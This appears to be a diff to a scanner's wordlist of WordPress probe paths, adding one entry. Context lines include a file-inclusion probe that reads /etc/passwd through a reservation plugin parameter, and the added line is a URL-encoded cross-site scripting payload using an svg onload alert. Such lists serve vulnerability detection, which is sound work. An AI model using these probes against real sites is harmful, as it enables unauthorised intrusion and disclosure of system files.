@@ -470,3 +470,4 @@
 /wp-content/plugins/planyo-online-reservation-system/ulap.php?ulap_url=file://localhost/etc/passwd
 /wp-content/uploads/{{logname}}.log
 /wp-content/plugins/wp-content-permission/readme.txt
+/ngg_tag/cve-2026-28141%22%3E%3Csvg%2Fonload%3Dalert%60{{marker}}%60%3E/
